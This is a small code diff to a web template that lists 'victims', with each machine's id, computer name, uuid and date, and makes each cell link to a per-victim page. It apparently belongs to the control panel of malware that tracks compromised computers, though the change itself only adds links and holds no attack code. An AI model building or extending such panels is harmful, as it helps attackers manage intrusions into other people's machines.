@@ -25,10 +25,10 @@
                                 const clientDate = year + '-' + month + '-' + day + ' ' + hours + ':' + minutes
                             %>
                                 <tr>
-                                    <th scope="row"><%= clients[c].id %></th>
-                                    <td><%= clients[c].computerName %></td>
+                                    <th scope="row"><a href="/app/victims/<%= clients[c].uuid %>"><%= clients[c].id %></a></th>
+                                    <td><a href="/app/victims/<%= clients[c].uuid %>"><%= clients[c].computerName %></a></td>
                                     <td><a href="/app/victims/<%= clients[c].uuid %>"><%= clients[c].uuid %></a></td>
-                                    <td><%= clientDate %></td>
+                                    <td><a href="/app/victims/<%= clients[c].uuid %>"><%= clientDate %></a></td>
                                 </tr>
                             <% } %>
                         </tbody>
